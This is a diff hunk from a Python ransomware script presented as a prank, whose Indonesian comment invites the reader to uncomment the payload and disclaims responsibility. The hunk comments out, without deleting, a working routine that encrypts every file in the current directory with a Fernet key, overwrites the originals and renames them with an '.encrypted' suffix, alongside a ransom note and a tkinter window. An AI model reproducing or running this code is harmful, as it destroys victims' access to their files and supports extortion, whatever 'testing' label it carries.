@@ -106,29 +106,29 @@ ransom_note()
 # TINGGAL DI UNCOMMENT AJA, TPI SEGALA RESIKO NYA SAYA GAK TANGGUNG JAWAB, KARNA INI TUJUAN NYA BUAT UJI COBA + NGEPRANK AJA
 # =========================================================================================================================
 
-files = []
+# files = []
 
-for file in os.listdir():
-    if file == "main.py" or file == "encrypt.key" or file == "IRansom_Note.txt":
-        continue
-    if os.path.isfile(file):
-        files.append(file)
+# for file in os.listdir():
+#     if file == "main.py" or file == "encrypt.key" or file == "IRansom_Note.txt":
+#         continue
+#     if os.path.isfile(file):
+#         files.append(file)
 
-print(files)
+# print(files)
 
-key = Fernet.generate_key()
+# key = Fernet.generate_key()
 
-with open('encrypt.key', 'wb') as thekey:
-    thekey.write(key)
+# with open('encrypt.key', 'wb') as thekey:
+#     thekey.write(key)
 
-for file in files:
-    with open(file, "rb") as thefile:
-        contents = thefile.read()
-    encrypted_content = Fernet(key).encrypt(contents)
-    with open(file, 'wb') as thefile:
-        thefile.write(encrypted_content)
+# for file in files:
+#     with open(file, "rb") as thefile:
+#         contents = thefile.read()
+#     encrypted_content = Fernet(key).encrypt(contents)
+#     with open(file, 'wb') as thefile:
+#         thefile.write(encrypted_content)
 
-    os.rename(file, file + ".encrypted")
+#     os.rename(file, file + ".encrypted")
 
 
 app = tk.Tk()
